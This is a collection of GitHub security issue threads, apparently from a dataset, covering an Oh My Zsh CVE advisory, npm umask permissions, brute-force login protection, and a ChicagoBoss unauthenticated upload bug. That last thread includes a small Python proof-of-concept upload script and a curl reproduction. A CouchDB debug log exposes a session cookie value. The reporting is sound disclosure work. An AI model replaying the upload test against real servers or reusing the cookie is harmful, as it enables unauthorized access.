This situation was quite schizophrenic to me so I decided to modify Identity and UserStorage. There is no problem to rewrite Identity, but when I tried to modify (inheritted) UserStorage, I have realized that there is only few lines to rewrite but due to private fields I had to copy almost whole implementation. 

So, is it possible to change [these 3 fileds](https://github.com/nette/nette/blob/master/Nette/Http/UserStorage.php#L22-L29) to protected or at least could you answer me, why there is such a [condition](https://github.com/nette/nette/blob/master/Nette/Http/UserStorage.php#L175)? I would like to store only id, but to modify this condition, I have to rewrite so much... for what reason?
","Related: http://forum.nette.org/cs/9574-jak-rozsirit-userstorage

Also have a look at https://github.com/Majkl578/nette-identity-doctrine
thx.

It's quite dirty workaround to me, but it's working =)
Yeah. I know it's dirty. Better than nothing though. ;-)
I disagree, [Majkl578/nette-identity-doctrine](https://github.com/Majkl578/nette-identity-doctrine) is awesome :)
",no,"1-feature,2-security,"
BitLucid/ninjawars,508354,"Hack Prevention: As a sysadmin, I want brute-force hacking of logins to be protected against.","We need to design and implement a way of preventing this. I'm thinking that failure should increment a counter, failing X times triggers a lock and an email, and that lock is stored as a date, and unless the lock is cleared via the email, logins will fail until X hours after lock was initially created.

Needs to be discussed.
","Mmm, denial of service is a problem with locks, although the email issue would protect against that somewhat.

In general, if we're going to go all the way, we might as well go all the way and protect against 5000 checks for different usernames with the same or similar simple passwords.

There's an interesting post on the topic here:
http://stackoverflow.com/questions/479233/what-is-the-best-distributed-brute-force-countermeasure
Which goes beyond protecting individuals into site-wide countermeasures.

And there's this interpretation: 
http://stackoverflow.com/questions/2090910/how-can-i-throttle-user-login-attempts-in-php/2093333#2093333
Which has a table suggestion for creating site-wide limitations, i.e.
CREATE TABLE failed_logins(
    id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(16) NOT NULL,
    ip_address INT(11) UNSIGNED NOT NULL,
    attempted DATETIME NOT NULL
);
or, better:
CREATE TABLE failed_logins(
    id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    login TEXT NOT NULL,
    ip_address INT(11) UNSIGNED NOT NULL,
    user_agent TEXT,
    attempted DATETIME NOT NULL,
    unlocked boolean default false
);
And then select against multiple criteria to determine delay and to determine locking mechanism.
I'm also looking to revise the login system in the near future to finally allow persistent login, so it might be a good time at that point for a complete overhaul of all the login stuff.
Created a login_attempts table.
@beagle Would you be willing to take point on this security issue?  No timeline, but it's either you or me so that this doesn't get lost in the bushes.
",no,"Important,Security,"
Arachnid/netboot.me,51132,"Sign & verify responses from netboot.me for security","gPXE should be enhanced with the ability to verify hashes and RSA signatures; netboot.me should return them, so that users can be assured there are no men-in-the-middle.
",,no,"feature request,bootloader,security,"
YaleSTC/shifts,40713856,"Upgrade to Rails 4","[Rails 3.2 is no longer supported for bug fixes, or anything less than a severe security issue.](http://guides.rubyonrails.org/maintenance_policy.html) We really can't afford to run any of our apps on Rails 3.2 anymore. We should upgrade ASAP after we finish getting Shifts 3 on Rails 3 as stable as possible.
","@njlxyaoxinwei This is now more critical because there are at least ]2 open security alerts for Rails 3.](https://gemnasium.com/YaleSTC/shifts/alerts)
Let me first get Shifts3 onto rails 3.2.21 then
",no,"diff: advanced,enhancement,security,"
ohmyzsh/ohmyzsh,1051887456,"Report for vulnerabilities in Oh My Zsh (2021-11-12)","[6 days ago](https://github.com/ohmyzsh/ohmyzsh/issues/10380) we were informed of a vulnerability in Oh My Zsh that could allow a malicious party to execute commands in a target's machine, **only if multiple conditions were met**.

The vulnerability (CVE-2021-3934) was reported via [huntr.dev](https://huntr.dev/bounties/ad2b5c3f-a3ce-4407-94dc-354c723310ce), and was found by @ry0tak ([Twitter](https://twitter.com/Ryotkak), [Blog](https://blog.ryotak.me/)).

I validated that the vulnerability was present in the latest release of Oh My Zsh, and that it could be exploited by a malicious party in a target's machine, in this case **with user intervention** and **only if the user had enabled a particular plugin and theme using it**. More information about this particular vulnerability will be provided below.

After reproducing that bug and finding a fix, I went looking for similar vulnerabilities in the Oh My Zsh project, and found 4 others that were similar, some easier to exploit than the first one reported.

Commits 6cb41b70, 06fc5fb1, a263cdac, 72928432 and b3ba9978 fix all of these vulnerabilities.

## TL;DR How do I apply the security patches?

The fix to all of these vulnerabilities is to just **update Oh My Zsh to the latest version**.

Run the following command:

```zsh
omz update
```

You might see something like this in the changelog:

![changelog screenshot](https://user-images.githubusercontent.com/1441704/141373919-e17da21e-f8fe-44b1-9c4a-3d7778058ab8.png)

b3ba9978 is the last in the series of fixes, which were **released in November 11 22:13 UTC**. If you updated after that you're already patched. **Please open an issue if you have trouble updating**.

## Vulnerabilities

### 1. Vulnerability in `omz_urldecode` function (CVE-2021-3934)

**You might be affected if**:

- You're using the `svn` plugin and themes using `svn_prompt_info`: `adben`, `awesomepanda`, `kiwi`, `minimal`.

- You're using the `omz_urldecode` function in custom user code.

**How it could be exploited**: checkout and cd into malicious svn repository.

### 2. Vulnerability in `dirhistory` plugin (CVE-2021-3725)

**You might be affected if**:

- You're using the `dirhistory` plugin.

**How it could be exploited**: cd in and out of a malicious directory.

### 3. Vulnerability in `title` function (CVE-2021-3726)

**You might be affected if**:

- You're using the `title` function **in custom user code**.

**How it could be exploited**: depends on the way you're using the `title` function. **With the default Oh My Zsh settings this is not vulnerable**.

### 4. Vulnerability in `rand-quote` and `hitokoto` plugins (CVE-2021-3727)

**You might be affected if**:

- You're using the `rand-quote` plugin.
- You're using the `quote` plugin.

**How it could be exploited**: a malicious quote has been shown (there is no real evidence of this).

### 5. Vulnerability in `pygmalion`, `pygmalion-virtualenv` and `refined` themes (CVE-2021-3769)

**You might be affected if**:

- You're using one of these themes.
- You use git repositories.

**How it could be exploited**: clone and cd into malicious git repository.

----

We will update the issue with details about how you could how this vulnerabilities would be used, which is more difficult than what you might think at first. Please **subscribe to this issue to get notified** when new information comes out. 

If you have any issues updating, please open a new support issue and we'll do our best to help.

If you need a place to discuss these vulnerabilities, or ask questions about them in general, use #10437.","UPDATE: the [huntr.dev](https://huntr.dev) report by @Ry0tak for the first vulnerability (CVE-2021-3934) is now public. [You can find it here](https://huntr.dev/bounties/ad2b5c3f-a3ce-4407-94dc-354c723310ce).
# Vulnerability details

Almost 3 weeks have passed since the initial fixes were pushed and the report was first announced. It's time now to give more details about these vulnerabilities:

- A longer description about the vulnerability
- Affected areas of the codebase
- What conditions need to happen to be vulnerable

CVEs have now been assigned to all vulnerabilities and the original post has been updated.

---

These vulnerabilities are different from each other due to how they can be exploited, but they essentially fall into these two types:

- Unsafe use of `eval`.
- Unsafe use of `print`.

# Unsafe use of `eval`

These 2 vulnerabilites have one thing in common: they use `eval` on a user-supplied string, which could be used by an attacker to execute arbitrary code. As I'll explain below, were this to be exploited it would be very obvious to you, but under the right conditions it could be done automatically without your knowledge.

## 1. Vulnerability in `omz_urldecode` function and `svn` plugin (CVE-2021-3934)

*This is the vulnerability that @Ry0taK found.*

**Description**: `omz_urldecode` (in `lib/functions.zsh`) uses `eval` to decode a URL-encoded string. The `svn` plugin uses that function to decode the URL of an svn repository, when running the `svn_prompt_info` function. This means that, if using a theme that uses this function, a malicious svn repository could trigger the bug in the `omz_urldecode` function and execute arbitrary code.

**Fixed in**: [6cb41b70](https://github.com/ohmyzsh/ohmyzsh/commit/6cb41b70).

**Impacted areas**:

- `omz_urldecode` in `lib/functions.zsh` and code that uses it (custom user code that uses it can be impacted as well).
- `svn_prompt_info` in `plugins/svn/svn.plugin.zsh` (if you're using the `svn-fast-info` plugin this doesn't affect you).
- Themes that use the `svn_prompt_info` function: `adben`, `awesomepanda`, `kiwi`, `minimal`.

**Conditions to exploit**:

These are the pre-conditions for vulnerability. Either:

- You use the `omz_urldecode` function in custom code. If that's the case, the conditions to exploit will depend on
  how you use the `omz_urldecode` function.

or

- You use the `svn` plugin **and** you use the `svn_prompt_info` function (the themes specified above do that by default).
  In this specific case, here's how this could be exploited:

   1. You check out a malicious svn repository.
   2. You cd into that repository in a directory with a specially-crafted name.
   3. You trigger the `svn_prompt_info` function inside that directory or its children (this happens automatically
      when using one of the mentioned themes).

## 2. Vulnerability in `dirhistory` plugin (CVE-2021-3725)

**Description**: the widgets that go back and forward in the directory history, triggered by pressing Alt-Left and Alt-Right, use functions that unsafely execute `eval` on directory names. If you happen to cd into one of these weirdly-named directories\* and press Alt-Left or Alt-Right, you could trigger the vulnerability.

\* When I say weirdly-named, this means that certain symbols need to appear, so you would definitely notice.

**Fixed in**: [06fc5fb](https://github.com/ohmyzsh/ohmyzsh/commit/06fc5fb).

**Impacted areas**:

As I said before, this vulnerability only affects the `dirhistory` plugin. Particularly, functions `pop_past` and
`pop_future`, which unsafely use `eval` on directory names.

**Conditions to exploit**:

1. You use the `dirhistory` plugin.
2. You cd into a directory with a specially-crafted name, or one of it's children.
3. You press Alt-Left or Alt-Right (this would happen instantly only by pressing Alt-Left).
   NOTE: in macOS, the plugin uses Option instead of Alt.

# Unsafe use of `print`

Zsh's `print` builtin is generally safe, but if used with `print -P` it could be unsafe if the `prompt_subst` option is enabled and the input is user-supplied.

## 3. Vulnerability in `title` function (CVE-2021-3726)

**Description**: the `title` function defined in `lib/termsupport.zsh` uses `print` to set the terminal title to a user-supplied string. In Oh My Zsh, this function is always used securely, but custom user code could use the `title` function in a way that is unsafe.

**Fixed in**: [a263cdac](https://github.com/ohmyzsh/ohmyzsh/commit/a263cdac).

**Impacted areas**:

- `title` function in `lib/termsupport.zsh`.
- Custom user code using the `title` function.

**Conditions to exploit**:

1. You have custom user code that uses the `title` function.

2. The `title` function receives inputs that isn't sanitized or can be supplied by an attacker.
   Similarly to the dirhistory plugin, this could be if you use the `title` function to set the
   terminal title to the name of a directory you cd into, and this directory has a weird name,
   in a similar but not equal way to the dirhistory plugin.

**In Oh My Zsh this doesn't happen**, so again I'd like to emphasize that **custom user code needs
to be used for this vulnerability to exist**.

### 4. Vulnerability in `rand-quote` and `hitokoto` plugins (CVE-2021-3727)

The `rand-quote` and `hitokoto` plugins define functions that fetch quotes from quotationspage.com and hitokoto.cn respectively. I have found no evidence that these sites contain malicious quotes, but I can't be sure that they don't.

I debated whether to consider this a vulnerability, given that the ""attacker"" would need to compromise these 2 websites. Nevertheless, you can never be too safe. But please read this with skepticism.

**Description**: the `rand-quote` and `hitokoto` fetch quotes from quotationspage.com and hitokoto.cn respectively, do some process on them and then uses `print` to print them. If these quotes contained the proper symbols, they could trigger command injection.

**Fixed in**: [72928432](https://github.com/ohmyzsh/ohmyzsh/commit/72928432).

**Impacted areas**:

- `rand-quote` plugin (`quote` function).
- `hitokoto` plugin (`hitokoto` function).

**Conditions to exploit**:

1. The user has either of these plugins enabled, and uses the `quote` or `hitokoto` function to
   fetch quotes (this is normally used as a Message Of The Day, to display a quote on login).

2. The website offers a quote that contains malicious input. This malicious input needs to contain
   the proper symbols for Zsh to interpret it as a command.

3. In the case of the `rand-quote` plugin, this quote would need to be the first one in the
   returned list of quotes, due to the nature of how the plugin works.

4. The quote with malicious input is printed to the terminal and the commands in the quote executed.

## 5. Vulnerability in `pygmalion`, `pygmalion-virtualenv` and `refined` themes (CVE-2021-3769)

**Description**: these themes use `print` on user-supplied strings to print them to the terminal.
All of them do that on git information, particularly the branch name, so if the branch is specially-named
the vulnerability could be triggered.

**Fixed in**: [b3ba9978](https://github.com/ohmyzsh/ohmyzsh/commit/b3ba9978).

**Impacted areas**:

- `pygmalion` theme.
- `pygmalion-virtualenv` theme.
- `refined` theme.

**Conditions to exploit**:

1. You have enabled one of the themes mentioned above.
2. You clone a git repository that has a specially-named branch.
3. You cd into the repository or one of its child directories.
4. The theme runs the code that prints the branch name, triggering the vulnerability.

----

As always, you can discuss these vulnerabilities in https://github.com/ohmyzsh/ohmyzsh/discussions/10437 or on our [Discord server](https://discord.gg/ohmyzsh).",no,"Security,Area: meta,"
bossmc/joker,940426394,"[Security] Update rake requirement from ~> 10 to >= 10, < 14","Updates the requirements on [rake](https://github.com/ruby/rake) to permit the latest version.
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rake/CVE-2020-8130.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>OS Command Injection in Rake</strong>
There is an OS command injection vulnerability in Ruby Rake &lt; 12.3.3 in
Rake::FileList when supplying a filename that begins with the pipe character
<code>|</code>.</p>
<p>Patched versions: &gt;= 12.3.3
Unaffected versions: none</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-jppv-gw3r-w3q8"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects rake</strong>
There is an OS command injection vulnerability in Ruby Rake before 12.3.3 in Rake::FileList when supplying a filename that begins with the pipe character <code>|</code>.</p>
<p>Affected versions: &lt;= 12.3.2</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/ruby/rake/blob/master/History.rdoc"">rake's changelog</a>.</em></p>
<blockquote>
<p>=== 13.0.6</p>
<ul>
<li>Additional fix for <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/389"">#389</a>
Pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/390"">#390</a> by hsbt</li>
</ul>
<p>=== 13.0.5</p>
<ul>
<li>Fixed the regression of <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/388"">#388</a>
Pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/389"">#389</a> by hsbt</li>
</ul>
<p>=== 13.0.4</p>
<ul>
<li>Fix rake test loader swallowing useful error information.
Pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/367"">#367</a> by deivid-rodriguez</li>
<li>Add -C/--directory option the same as GNU make.
Pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/376"">#376</a> by nobu</li>
</ul>
<p>=== 13.0.3</p>
<ul>
<li>Fix breaking change of execution order on TestTask.
Pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/368"">#368</a> by ysakasin</li>
</ul>
<p>=== 13.0.2</p>
<p>==== Enhancements</p>
<ul>
<li>Fix tests to work with current FileUtils
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/358"">#358</a> by jeremyevans</li>
<li>Simplify default rake test loader
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/357"">#357</a> by deivid-rodriguez</li>
<li>Update rdoc
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/366"">#366</a> by bahasalien</li>
<li>Update broken links to rake articles from Avdi in README
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/360"">#360</a> by svl7</li>
</ul>
<p>=== 13.0.1</p>
<p>==== Bug fixes</p>
<ul>
<li>Fixed bug: Reenabled task raises previous exception on second invokation
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/271"">#271</a> by thorsteneckel</li>
<li>Fix an incorrectly resolved arg pattern
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/327"">#327</a> by mjbellantoni</li>
</ul>
<p>=== 13.0.0</p>
<p>==== Enhancements</p>
<ul>
<li>Follows recent changes on keyword arguments in ruby 2.7.
Pull Request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/326"">#326</a> by nobu</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/ruby/rake/commit/5c60da8644a9e4f655e819252e3b6ca77f42b7af""><code>5c60da8</code></a> Bump up Rake-13.0.6</li>
<li><a href=""https://github.com/ruby/rake/commit/73d4099cc9f5f49d0dd5859850cc0582596ca4a2""><code>73d4099</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/390"">#390</a> from ruby/fix-388-again</li>
<li><a href=""https://github.com/ruby/rake/commit/63aacb6c87c9e423102ddd7f7a09292000f911a7""><code>63aacb6</code></a> Added Rake namespace explicitly</li>
<li><a href=""https://github.com/ruby/rake/commit/29a3949faca43b8f6b94967160bf1ec429b1113b""><code>29a3949</code></a> Bump version to v13.0.5</li>
<li><a href=""https://github.com/ruby/rake/commit/3a95f4cc4259e04d61af90f61ce0aa36ab94a236""><code>3a95f4c</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/389"">#389</a> from ruby/fix-388</li>
<li><a href=""https://github.com/ruby/rake/commit/85c55b49a1ea85840e6f3eb19cc52bf8bd3af62b""><code>85c55b4</code></a> Fixed the regression of <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/388"">#388</a></li>
<li><a href=""https://github.com/ruby/rake/commit/72ac79629ac1de851f7ee27fbec0a16eddef937d""><code>72ac796</code></a> History for rake-13.0.4</li>
<li><a href=""https://github.com/ruby/rake/commit/b20de7859dc94684ba30006bb5b0008af429fb5f""><code>b20de78</code></a> Bump version to 13.0.4</li>
<li><a href=""https://github.com/ruby/rake/commit/a07e637c080d8674cd2e1da26c51aaacb67b2d80""><code>a07e637</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/ruby/rake/issues/386"">#386</a> from ruby/cleanup</li>
<li><a href=""https://github.com/ruby/rake/commit/0acc575ef1c737e442aadc6d1ea2e3d7051e982a""><code>0acc575</code></a> Use require_relative to specify release version</li>
<li>Additional commits viewable in <a href=""https://github.com/ruby/rake/compare/v10.4.2...v13.0.6"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=rake&package-manager=bundler&previous-version=10.4.2&new-version=13.0.6)](https://dependabot.com/compatibility-score/?dependency-name=rake&package-manager=bundler&previous-version=10.4.2&new-version=13.0.6)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
npm/npm,102234932,"umask setting is ignored for some directories","### Expected Behavior

All directories created by `npm install` should have the npm config setting `umask` applied to their file mode/permissions. The `umask` setting is [clearly described as](https://docs.npmjs.com/misc/config#umask) the ""value to use when setting the file creation mode on files and folders.""
### Observed Behavior

During `npm install`, if directories are created by the `tar` module as a side-effect of extracting a file, the umask setting is ignored. For example, when tar extracts `foo/bar/baz.js`, it creates the `foo` and `foo/bar` directories (if they don't exist) before writing `baz.js`. These directories do not respect the umask setting.

Instead, npm's umask setting is ignored and [`process.umask()` is used](https://github.com/npm/fstream/blob/master/lib/writer.js#L15). However, there is a further bug/unexpected behavior where the `tar` module will actually [do the equivalent of `chmod a+x`](https://github.com/npm/fstream/blob/master/lib/writer.js#L352) on directories created as a side-effects of file extraction, meaning the even `process.umask()` isn't strictly observed.
### Details
- OS: Mac OS X 10.9.5
- `npm --version`: `2.13.5`
- `node --version`: `v0.10.40`
- `npm config get umask`: `0077`
- `umask`: `0077`

An example is seen if you install `grunt-lib-phantomjs`. The directory `node_modules/phantomjs/lib` (as an example) should have a mode of `0700`; instead, it has a mode of `0711`.
","Since I see this has been tagged as a feature request and support request, I want to be clear that this is definitely a bug in npm.

The umask setting in npm is being completely ignored for a seemingly arbitrary subset of operations during `npm install`. This is almost certainly not the intended behavior. It also explicitly disagrees with the behavior described in the documentation, and is inconsistent even within the observed behavior of npm (sometimes it respects umask, other times it doesn't, for no good reason).

The underlying cause (cited in the issue) is that the tar module isn't aware of npm's `umask` setting, and just does its own thing (using the `process.umask()` value, then overriding the execute bit on it.)

But in summary, this is 99.9% likely to be a real bug, not a new feature or user usage problem. 
This issue still exists in npm version 3.4.0 and is most certainly a bug and not a new feature or user usage problem.

Please see https://github.com/npm/npm/issues/4197 which is correctly tagged as a bug.

#### Details
- OS: Debian GNU/Linux 7.8 (wheezy)
- `npm --version`: `3.4.0`
- `node --version`: `v4.2.2`
- `npm config get umask`: `0022`
- `umask`: `0077`
This is marked as a feature request in part because the current behavior that npm has is underspecified. The first step to making npm's behavior here clearer is to nail down what the current behavior is, and why. Tagging this with `footgun` gets it onto npm's road map, and the next step for the CLI team is to unearth and document the historical reasoning for how the various pieces of npm (including `node-tar`) handle permissions.
After discussing this as a team, we think the right thing for npm to do is to ignore whatever permissions or UIDs are set in the package tarball, and explicitly squash everything to be written with the current user's user ID and umask in all cases _except_ when npm is being run as root without `--unsafe-perm` being overwritten (you should never have files owned by nobody on your filesystem).

This is a mildly tricky bit of work because it requires good tests, and also because we need to make sure whatever API calls the CLI uses don't cause problems on Windows, but this is something we plan to address within the medium-term. If somebody else wants to treat the first paragraph as a rough spec and start working on a patch, that would be very welcome!
Did this issue get lost (honest question, no sarcasm)?
In my opinion it needs lot more love as the possible security implications could be quite catastrophic on a multi-user system and this issue is reported for over a year now.
The worst case scenario is that such directory results in the possibility to replace its content by a non-root user with evil code that may me executed by another user (including possibly root).

What I observed (even with newest npm 3.10.9) that it **sometimes** creates node_modules directories with permission 777. when doing the `npm install` multiple times the results vary, most of the time it results in 755 but sometimes in 777). This seems to have nothing to do with the source tarballs content (retrieved from registry.npmjs.org) but a more general issue. As mentioned, its not deterministic and the tarballs definitively don't contain any files/directories with such permissions.

This problem was observed while creating packages for a Linux distribution and boiled down to finding this ticket.
We're closing this issue as it has gone thirty days without activity.  In our experience if an issue has gone thirty days without any activity then it's unlikely to be addressed.  In the case of bug reports, often the underlying issue will be addressed but finding related issues is quite difficult and often incomplete.

If this was a bug report and it is still relevant then we encourage you to open it again as a new issue.  If this was a feature request then you should feel free to open it again, or even better open a PR.

For more information about our new issue aging policies and why we've instituted them please see our [blog post](http://blog.npmjs.org/post/161832149430/npm-the-npm-github-issue-tracker-and-you).
@othiym23 @isaacs @iarna
can you please reopen and revisit this issue, npm 5.6.0 still randomly ends up creating node_modules directories with 777 that contain code.
PS: This npm-robot that auto-closes a security issue because nobody replied is quite damaging
  Aug 20, 2015

O I am laffin.Issue not fixed in 30 days?
Must be gone!Not treating security seriously, are we?Yeah, this seems to have gotten swept up -- the bot shouldn't have just closed the issue like that.

There was a step forward and a step back on this over the past year, and we haven't touched the issue since. The `patch-welcome` tag continues to apply, so if you think writing code is a more worthwhile endeavor than snarking on foss issue trackers, we super welcome your contributions!",no,"bug,patch-welcome,feature-request,footgun,security,already-looked-at,bot-closed,"
chusopr/casimir,485998287,"Hide git files","When the webroot is cloned from git, the default `.htaccess` file allows access to the `.git` and `.gitignore`.",,no,"Security,"
ChicagoBoss/ChicagoBoss,182091097,"Any controller will accept an uploaded file even if there's no POST method and put it in scratch/","I tried uploading a file to the default / handler in my application with the following script. (cat.jpg is just a file sitting in the same directory as this script)

```
# upload.py tests file open vulnerability in Erlang ""ChicagoBoss"" framework
# use ""poster"" package https://atlee.ca/software/poster/
# pip install poster

from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import urllib2

# Register the streaming http handlers with urllib2
register_openers()

# Start the multipart/form-data encoding of the file ""DSC0001.jpg""
# ""cat"" is the name of the parameter, which is normally set
# via the ""name"" parameter of the HTML <input> tag.

# headers contains the necessary Content-Type and Content-Length
# datagen is a generator object that yields the encoded parameters
datagen, headers = multipart_encode({""cat"": open(""cat.jpg"", ""rb"")})

# Create the Request object
request = urllib2.Request(""http://10.0.1.195/"", datagen, headers)
# Actually do the request, and get the response
print urllib2.urlopen(request).read()
```

There's no POST handler at route /

```
-module(beakconsole_main_controller, [Req]).
-compile(export_all).

before_(_) ->
    user_lib:require_login(Req).

index('GET', [], ChannelMaster) ->
    % return the name of this node (node) and a list of all connected nodes (nodes)
    { ok, [{channelmaster, ChannelMaster}, {node, node()}, {nodes, nodes()}] }.

error404('GET', []) ->
    { ok, []}.
```

A scratch directory is created:

```
[famserve@localhost beakconsole]$ ls -lat
total 280
drwxr-xr-x.  9 famserve famserve   4096 Oct 10 14:55 .
drwxr-xr-x.  2 web      web       4096 Oct 10 14:55 scratch
```

and the file is there:

```
[famserve@localhost beakconsole]$ ls -l scratch/
total 24
-rw-r--r--. 1 web web 22491 Oct 10 14:55 63-138-82-204-201-145-151-170-221-154-79-155-142-101-27-104
[famserve@localhost beakconsole]$ 
```

It would probably be a good idea to at least check to see if there's a Post Method before allowing this. 

Also, the user wasn't logged in, so the before_ method actually redirected to my login controller. And the file still made it up!

```
[swirsky@Thrills-iMac test (develop)]$ python upload.py 


<form method=""post"">
Name:<br />
<input name=""name"" /><br /><br />

Password:<br />
<input name=""password"" type=""password"" /><br /><br />

<input type=""submit"" value=""Log in"" />
<input type=""hidden"" name=""redirect"" value=""/main"" />
</form>
```

I think I can handle this in the before_, but I didn't expect this. I noticed it when some systems we have in production were collecting all sorts of ""malware"" in this scratch directory. (Fortunately, none of this PhP malware has any power in this directory and in the Erlang Universe.)
","I think this is mainly a SimpleBridge issue, but there may be away to control SimpleBridge so it doesn't do this.

The quickest workaround I found was to add a 'POST' handler that deletes the file.
Yeah this one also surprised me. The same behaviour does also apply to [simple_bridge_handler_sample.erl](https://github.com/nitrogen/simple_bridge/blob/master/src/simple_bridge_handler_sample.erl), which could be easily reproduced with the `simple_bridge` example server:

``` sh
> make run_inets
...
> curl -X GET http://127.0.0.1:8000/peer_ip -F 'file1=@<pathh_to_file>'
...
> ls -l scratch/
total 3520
-rw-r--r--  1 david  staff   1.7M Nov  5 15:44 78-200-77-73-91-82-21-199-130-108-240-188-19-104-115-117
```

 Not sure if it's some kind of default case misbehaviour or maybe even intentional. Maybe @choptastic could be so kind and give us some details on how it's intended?

@chatterbeak we came up with another workaround which seems IMHO to be a little bit more complete and prevents from forgetting some controller endpoints. We're using a `boss_filter` which looks similar to this one:

``` erl
-module(some_boss_filter).

-export([
    after_filter/3
]).

after_filter({StatusCode, Payload, Headers}, _FilterConfig, RequestContext) ->
    case lists:keyfind(request, 1, RequestContext) of
        {request, Request} ->
            handle_request_cleanup(Request);
        false ->
            lager:error(""Couldn't find request in context for final data cleanup"", [RequestContext])
    end,
    {StatusCode, Payload, Headers};
after_filter(Other, _FilterConfig, _RequestContext) ->
    %% Will match for 500er errors
    Other.

%%--------------------------------------------------------------------
%%% Internal functions
%%--------------------------------------------------------------------

handle_request_cleanup(Request) ->
    lists:foreach(fun(Attachment) ->
        {LogLevel, DeleteResult} =
        case file:delete(sb_uploaded_file:temp_file(Attachment)) of
            {error, enoent} ->
                %% The file was already deleted from business logic so only a debug log is needed
                {debug, file_already_deleted};
            OtherReturn ->
                {notice, OtherReturn}
        end,
        lager:log(LogLevel, self(), ""Deleting remaining temporary file ~p with name ~p, size ~p byte and ""
                                    ""field_name ~p from scratch folder; result: ~p"", [
            sb_uploaded_file:temp_file(Attachment),
            sb_uploaded_file:original_name(Attachment),
            sb_uploaded_file:size(Attachment),
            sb_uploaded_file:field_name(Attachment),
            DeleteResult
        ])
    end, Request:post_files()).
```

and in in the `boss.config`:

``` erl
[{boss, [
    ...
    {controller_filter_modules, [
         some_boss_filter
    ]},
    ...
]}]
```
Thanks for the ideas. 

I noticed this because various ""malicious"" php scripts were appearing in the scratch directory on some of my ChicagoBoss sites. Fortunately, the couldn't really do harm. But if you look at the constant barrage of PHP exploit attempts that any public website sees, it's common for these exploit suites to try uploading files to ""/"" and seeing if they can get them to run.
",no,"security,"
pierrel/SomethingToWear,78777,"Validation sometimes doesn't run","Happens very sporadically when trying to ""like"" an outfit.

This is from the couchdb log:
[debug] [<0.3078.0>] 'POST' /wear/ {1,1}
Headers: [{'Accept',""application/json, text/javascript, _/_""},
          {'Accept-Encoding',""gzip, deflate""},
          {'Accept-Language',""en-us""},
          {'Connection',""keep-alive""},
          {'Content-Length',""186""},
          {'Content-Type',""application/json, application/x-www-form-urlencoded""},
          {'Cookie',""AuthSession=dXNlci1ib21iYXk6NEFGMjM4QTg6Y7rR-p6-MzPTeM4rsxb7hsCkEPk""},
          {'Host',""localhost:5984""},
          {""Origin"",""file://""},
          {'User-Agent',""Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-us) AppleWebKit/531.9 (KHTML, like Gecko) Version/4.0.3 Safari/531.9""},
          {""X-Couchdb-Www-Authenticate"",""Cookie""},
          {""X-Requested-With"",""XMLHttpRequest""}]
[debug] [<0.3078.0>] request_group {Pid, Seq} {<0.113.0>,1185}
[debug] [<0.3078.0>] timeout 600
